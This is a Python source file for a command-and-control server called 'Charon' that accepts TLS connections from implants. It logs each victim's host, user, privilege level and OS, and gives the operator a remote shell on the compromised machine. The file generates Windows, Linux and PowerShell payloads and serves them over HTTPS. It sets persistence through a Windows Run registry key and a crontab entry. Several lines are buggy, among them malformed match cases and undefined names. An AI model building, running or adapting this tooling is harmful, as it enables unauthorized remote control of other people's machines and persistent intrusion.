#!/usr/bin/python3

import base64
import contextlib
import random
import shutil
import socket
import string
import subprocess
import threading
import time
import ssl
from datetime import datetime
from prettytable import PrettyTable
from colorama import Fore, Style
from rich.table import Table
from rich import box
from config.design import *
from config.commands import *
from config.database.database_functions import *
from config.create_config_file import config_obj
from modules.implant_conf.implant_python import winpy, linpy, exepy
from modules.implant_conf.implant_pwsh import pshell_cradle
from modules.implant_conf.implant_gen import set_server_addr


####################CONFIG#####################
config_obj.read('config/config.ini')

database_config = config_obj["DATABASE"]
ssl_config = config_obj["SSL"]
server_config = config_obj["SERVER"]

def update_config():
    server_config["host_ip"] = host_ip
    server_config["host_port"] = host_port
    with open('config/config.ini', 'a+') as conf:
        config_obj.write(conf)
    success("Config Updated")
###############################################


database_connect(database_config["targets_db"])
# add_target_db()
# update_target_db()
# delete_target_db()


def comm_in(targ_id):
    """
    Accepts connection from implants
    :param targ_id:
    :return:
    """

    process("Waiting for Response...")
    return targ_id.recv(4096).decode()


def comm_out(targ_id, message):
    """
    Sends commands to implants
    :param targ_id:
    :param message:
    :return:
    """

    targ_id.send(bytes(message.encode()))


def kill_sig(targ_id, message):
    """
    Sends kill command to implants
    :param targ_id:
    :param message:
    :return:
    """

    targ_id.send(bytes(message.encode()))
            

def target_comm(targ_id, targets, num):
    """
    Handles communication with implants
    :param targ_id:
    :param targets:
    :param num:
    :return:
    """

    while True:
        message = console.input(f"[yellow]{targets[num][3]}@{targets[num][1]}$ ")
        comm_out(targ_id, message)

        match message.strip():
            case 'exit':
                targ_id.send(bytes(message.encode()))
                targ_id.close()
                # Mark client as dead in sessions list
                targets[num][7] = 'Dead'
                break

            # Commands
            case ('background', 'bg'):
                break

            case message ('persist', 'pt'):
                payload_name = console.input("[blue_violet][i] Enter Payload Name to Persist: ")
                if targets[num][6] == 1:
                    # Command 1
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    targ_id.send(persist_command_1.encode())
                    
                    # Command 2
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    targ_id.send(persist_command_2.encode())

                    # Always keep a command to clean up endpoints after an engagement
                    info("Run this command to cleanup the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")

                if targets[num][6] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    targ_id.send(persist_command.encode())
                    info("Run this command to clean up crontab (Remove Persistence): \n crontab -r")

                success("Persistence Technique Completed")

            case "download":
                try:
                    sock.send((message).encode())
                    exist = targ_id.recv(1024).decode()
                except OSError:
                    error("File does not exist")
                    continue
        
        if len(message) == 0:
            continue

        else:
            response = comm_in(targ_id)
            if response == 'exit':
                error("Client Connection Closed")
                targ_id.close()
                break
            print(response)


def listener_handler():
    """
    Handles connections and threads them
    :return:
    """

    sock.bind((host_ip, int(host_port)))
    process('Listener Started\n')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()


def time_record():
    cur_time = time.strftime("%H:%M:%S", time.localtime())
    date = datetime.now()
    time_record = f"{date.day}/{date.month}/{date.year} {cur_time}"
    return time_record
            

def comm_handler():
    """
    Generates table parameters and handles communication
    :return:
    """

    while kill_flag != 1:
        try:
            remote_target, remote_ip = sock.accept()
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile=ssl_config["certificate"], keyfile=ssl_config["privkey"])
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            remote_target = context.wrap_socket(remote_target, server_side=True)
            hostname = remote_target.recv(1048576).decode()
            hostname = base64.b64decode(hostname).decode()
            # Get info from implant
            username = remote_target.recv(1024).decode('utf-8')  # - 1
            username = str(username).strip()
            
            admin = remote_target.recv(1024).decode('utf-8')  # - 2
            admin = int(admin)
            
            op_sys = remote_target.recv(4096).decode('utf-8')  # - 3
            op_sys = str(op_sys).strip()

            # Check if username is populated, if not send NULL
            if username == "".strip():
                username = "NULL"

            # Check if user is admin
            # Windows
            if admin == 1:
                admin_val = "Admin"
            # Linux    
            elif username == 'root':
                admin_val = "Root"
            # All
            else:
                admin_val = "Unknown Privilege"

            # Operating System
            # pay_val = 1 if 'Windows' in op_sys else 2
            if op_sys == "Windows":
                pay_val = 1
            elif op_sys == "Linux":
                pay_val = 2
            else:
                pay_val = 2               

            # Add to table
            if hostname is not None:
                targets.append([remote_target,
                                f"{host_name[0]}@{remote_ip[0]}",  # Target
                                time_record,                       # Check in
                                username,                          # Username
                                admin_val,                         # Check Privileges (User/Admin)
                                op_sys,                            # Operating System (Windows/Linux)
                                pay_val,                           # Payload Type (1 - Windows/2 - Other)
                                'Active'                           # Status
                                ])

                console.print(
                    f'[green]\n[+] Connection Received from {host_name[0]} {remote_ip}\n'
                    + f'[yellow]{host_name}:{remote_ip}',
                    end='',
                )

            else:
                targets.append([remote_target,
                                remote_ip[0],
                                time_record,
                                username,
                                admin_val,
                                op_sys,
                                pay_val,
                                'Active'
                                ])
                success(
                    f'Connection Received from {remote_ip[0]}\n'
                    + f'Client@{host_ip}$ ',
                    end='',
                )
        except Exception as e:
            error(f"Error Caught: {e}")


def start_web_server():
    global web_server, web_servers
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(ssl_config["certificate"])
    handler = http.server.SimpleHTTPRequestHandler
    address = ((web_server_ip, int(web_server_port)))
    devnull = open(os.devnull, 'w')
    # sys.stdout = devnull
    sys.stderr = devnull
    with socketserver.TCPServer(address, handler) as web_server:
        web_server.socket = context.wrap_socket(web_server.socket, server_side=True)
        web_server.serve_forever()
    # web_server = socketserver.TCPServer(address, handler)
    # web_server.serve_forever()

    
def stop_web_server():
    global web_server, web_servers
    if web_server:
        web_server.shutdown()
        web_server.server_close()
        web_server = None
    for server in web_servers:
        server[2] = 'Dead'
    print('[+] Web server stopped.')


def exit_server():
    quit_message = console.input("[bold red]\n[!] Are you sure you want to quit? (yes/no): ").lower().strip()
    
    if quit_message.strip() in ['y', 'yes']:
        # continue
        tar_length = len(targets)
        # Delete Payloads
        process("Deleting Payloads")
        try:
            if os.path.exists('Generated Payloads'):
                shutil.rmtree('Generated Payloads')
            for target in targets:
                if target[7] != 'Dead':
                    comm_out(target[0], 'exit')
            global kill_flag
            kill_flag = 1
            if listener_counter > 0:
                sock.close()
            quit("Quitting...")
            return exit()
        except PermissionError as e:
            error(f"Permission Denied: {e}")
            pass


def connection():
    # TLS Configuration
    global sock
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=ssl_config["certificate"], keyfile=ssl_config["privkey"])
    context.verify_mode = ssl.CERT_NONE
    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_side=True)


# Main Function
if __name__ == "__main__":
    banner()
    connection()
    targets = []
    kill_flag = 0
    listener_counter = 0
    host_ip = server_config["host_ip"]
    host_port = server_config["host_port"]

    while True:
        try:
            command = console.input(f"[deep_sky_blue2]Charon@{host_ip}$ ").strip()

            match command.strip():
                case ('help' | 'h'):
                    help()
                    
                case ('clear' | 'cls'):
                    clear()
                    
                case ('listeners -g' | 'listeners --generate'):
                    if host_ip == "":
                        try:
                            host_ip = console.input("[blue_violet] [i] Enter Listener IP: ")
                            host_port = console.input("[blue_violet] [i] Enter Listener Port: ")
                            set_server_addr(host_ip, host_port)
                            listener_handler()
                            listener_counter += 1
                        except socket.gaierror as e:
                            error(f"Error initiating a listener, check your IP/PORT: {e}")
                            break
                    else:
                        info(f"Server Listening on: {host_ip}:{host_port}")
                        set_server_addr(host_ip, host_port)
                        listener_handler()
                        listener_counter += 1
                        
                case ('pshell_shell'):
                    pshell_cradle()
                    
                case 'winpy':
                    if listener_counter > 0:
                        winpy()
                    else:
                        error("Generate Listener First")

                case 'linpy':
                    if listener_counter > 0:
                        linpy()
                    else:
                        error("Generate Listener First")

                case 'exepy':
                    if listener_counter > 0:
                        exepy()
                    else:
                        error("Generate Listener First")
                        
                case ('exit'):
                    if exit_server() == False:    
                        kill_flag = 1
                        sock.close()
                        exit_server()
                    else:
                        continue

            if command.split(" ")[0] == "update":
                if command.split(" ")[1].strip() in "config":
                    update_config()
                if command.split(" ")[1].strip() in "repo":
                    update_repo()

            # Generate Sessions Commands
            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # List Sessions
                if command.split(" ")[1].strip() in ['-l', '--list']:

                    # Define Table
                    session_table = PrettyTable()
                    # session_table = Table(title="Implant Sessions",
                    #               box=box.ROUNDED)

                    # Table Headers
                        # Rich
                    # session_table.add_column("Session", style="royal_blue1")
                    # session_table.add_column("Status", style="spring_green1")
                    # session_table.add_column("Username", style="deep_pink4")
                    # session_table.add_column("Privilege", style="medium_violet_red")
                    # session_table.add_column("Target", style="dark_violet")
                    # session_table.add_column("Operating System", style="pale_turquoise4")
                    # session_table.add_column("Check-In Time", style="plum4")
                    
                        # PrettyTable
                    session_table.add_column = ([
                        "Session",
                        "Status",  # 7
                        "Username",  # 3
                        "Privilege",  # 4
                        "Target",  # 1
                        "Operating System",  # 5
                        "Check-In Time"])  # 2

                    # Table Rows
                    for target in targets:
                            # Rich
                        # session_table.add_row(
                        #             int(session_counter), 
                        #             target[7], 
                        #             target[3], 
                        #             target[4], 
                        #             target[1], 
                        #             target[5], 
                        #             target[2])

                            # PrettyTable
                        session_table.add_row([session_counter,
                                            target[7],  # Status
                                            target[3],  # Username
                                            target[4],  # Check Privileges (User/Admin)
                                            target[1],  # Target
                                            target[5],  # Operating System
                                            target[2]]) # Check-In Time
                    session_counter += 1

                    # Print Table
                    if session_table.columns:
                        console.print(session_table)
                    else:
                        info("No Data Added")
                # Interact with Session
                if command.split(" ")[1].strip() in ['-i', '--interact']:
                    try:
                        num = int(command.split(" ")[2].strip())
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            target_comm(targ_id, targets, num)
                        else:
                            error("The Dead Don't Talk - Cannot communicate with agent")
                    except IndexError:
                        error(f"Session {num} does not exist")
                        pass
                    except NameError:
                        error("Please enter a number")
                        pass

                # Kill Session
                if command.split(" ")[1].strip() in ['-k', '--kill']:
                    try:
                        num = int(command.split(" ")[2].strip())
                        targ_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            kill_sig(targ_id, 'exit')
                            targets[num][7] = 'Dead'
                            error(f"Session {num} Killed")
                        else:
                            error(f"Session {num} is already dead")
                    except IndexError:
                        error(f"Session {num} does not exist")
                    except NameError:
                        error("Enter a Session ID")
                        continue

        except KeyboardInterrupt:
            if exit_server() == False:    
                kill_flag = 1
                sock.close()
                exit_server()
            else:
                continue
        except ConnectionAbortedError as ConnAbort:
            error(f"Connection Error: {ConnAbort}")
            break
        except ConnectionResetError as ConnReset:
            error(f"Connection Error: {ConnReset}")
            break
        except Exception as e:
            error(f"Error Caught: {e}")
            continue